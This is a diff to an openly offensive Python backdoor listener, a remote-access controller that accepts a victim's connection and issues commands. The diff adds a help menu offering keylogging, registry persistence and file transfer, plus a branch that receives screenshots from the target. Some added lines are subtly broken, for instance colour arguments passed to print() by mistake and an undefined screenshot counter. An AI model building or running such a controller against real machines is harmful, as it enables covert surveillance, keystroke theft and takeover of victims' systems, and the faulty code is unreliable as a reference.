@@ -1,4 +1,5 @@
 import socket
+import termcolor
 import json
 import os
 
@@ -10,7 +11,7 @@ print("""
 ██║     ╚██████╔╝███████║   ██║   ██████╔╝╚██████╔╝╚██████╔╝██║  ██║
 ╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                     
-      """)
+      """,'yellow')
 
 startup_info = """!!!This script is the listner for the backdoor. 
 You will find the link for github repo. here:
@@ -22,7 +23,7 @@ Type 'help' to view the manual.
 example : 
 LHOST=192.168.54.2
 LPORT=443\n"""
-print(startup_info)
+print(startup_info,'blue')
 
 def reliable_send(data):
 	jsondata = json.dumps(data)
@@ -63,7 +64,17 @@ def target_communication():
 		if command == 'quit':
 			break
 		elif command == 'help':
-			print("Shell Commands: \n help - Show this manual. \n quit - exits the shell. \n download - downloads the file from target machine. \n example: 'download file_name.txt' \n upload - uploads file from this device to target. \n clear:- clear the screen.")
+			print(termcolor.colored('''\n
+            help                                --> Show this manual.
+            quit                                --> Quit Session With The Target
+            clear                               --> Clear The Screen
+            cd *Directory Name*                 --> Changes Directory On Target System
+            upload *file name*                  --> Upload File To The target Machine
+            download *file name*                --> Download File From Target Machine
+            keylog_start                        --> Start The Keylogger
+            keylog_dump                         --> Print Keystrokes That The Target Inputted
+            keylog_stop                         --> Stop And Self Destruct Keylogger File
+            persistence *RegName* *fileName*    --> Create Persistence In Registry'''),'green')
 		elif command == 'clear':
 			os.system('clear')
 		elif command[:3] == 'cd ':
@@ -72,6 +83,19 @@ def target_communication():
 			download_file(command[9:])
 		elif command[:6] == 'upload':
 			upload_file(command[7:])
+		elif command[:10] == 'screenshot':
+			f = open('screenshot%d' % (count), 'wb')
+			target.settimeout(3)
+			chunk = target.recv(1024)
+			while chunk:
+				f.write(chunk)
+				try:
+					chunk = target.recv(1024)
+				except socket.timeout as e:
+					break
+			target.settimeout(None)
+			f.close()
+			count += 1
 		else:
 			result = reliable_recv()
 			print(result)
@@ -81,8 +105,8 @@ host=input("[*] LHOST=")
 port=int(input("[*] LPORT="))
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind((host,port))
-print('[+] Listening For The Incoming Connections')
+print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
 sock.listen(5)
 target, ip = sock.accept()
-print('[+] Target Connected From: ' + str(ip))
+print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'green'))
 target_communication()
